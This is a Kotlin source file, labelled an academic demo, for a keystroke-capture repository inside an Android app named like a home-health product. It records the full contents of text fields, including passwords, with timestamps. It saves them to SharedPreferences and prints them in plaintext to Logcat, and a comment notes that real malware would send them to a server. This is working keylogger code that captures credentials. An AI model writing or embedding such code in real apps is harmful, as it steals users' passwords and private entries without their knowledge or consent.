package com.example.homehealth.keylogger

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * ACADEMIC DEMO: Keylog Repository
 * Stores and displays captured keystrokes in-memory and via Logcat.
 */
class KeylogRepository private constructor() {

    companion object {
        private const val TAG = "KEYLOGGER_DEMO"
        private var instance: KeylogRepository? = null

        fun getInstance(): KeylogRepository {
            return instance ?: synchronized(this) {
                instance ?: KeylogRepository().also { instance = it }
            }
        }
    }

    // In-memory log of all captured entries
    private val keylogEntries = mutableListOf<KeylogEntry>()
    private var prefs: SharedPreferences? = null

    /**
     * Initialize with app context for persistence.
     * Call this once in MainActivity.onCreate().
     *
     * @param context The application context
     */
    fun init(context: Context) {
        prefs = context.getSharedPreferences("keylog_prefs", Context.MODE_PRIVATE)
    }

    /**
     * Called whenever a text field's content changes.
     *
     * @param screenName  The Activity/Fragment where the field lives
     * @param fieldHint   The hint text of the EditText (e.g. "Email", "Password")
     * @param currentText The full current text in the field
     */
    fun log(screenName: String, fieldHint: String, currentText: String) {
        val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
        val entry = KeylogEntry(timestamp, screenName, fieldHint, currentText)
        keylogEntries.add(entry)

        // Optional: Persist to SharedPreferences for demo purposes
        // In real malware, this would be sent to a server
        if (prefs != null) {
            val key = "entry_${keylogEntries.size}"
            prefs!!.edit().putString(key, entry.toString()).apply()
        }

        // Visible in Logcat — filter by "KEYLOGGER_DEMO"
        Log.d(TAG, entry.toString())
        
        // Additional detailed logging for testing
        Log.v(TAG, "Entry #${keylogEntries.size}: screen=$screenName, field=$fieldHint, length=${currentText.length}")
        Log.v(TAG, "Full content captured: [$currentText]")
    }

    /**
     * Returns all captured entries (for displaying in a demo screen).
     */
    fun getAllEntries(): List<KeylogEntry> {
        return keylogEntries.toList()
    }

    /**
     * Clears the in-memory log.
     */
    fun clear() {
        keylogEntries.clear()
        if (prefs != null) {
            prefs!!.edit().clear().apply()
        }
    }

    // -------------------------------------------------------------------------
    // Inner model class
    // -------------------------------------------------------------------------

    data class KeylogEntry(
        val timestamp: String,
        val screenName: String,
        val fieldHint: String,
        val text: String
    ) {
        override fun toString(): String {
            return String.format(
                "[%s] Screen: %-20s | Field: %-15s | Text: \"%s\"",
                timestamp, screenName, fieldHint, text
            )
        }
    }
}
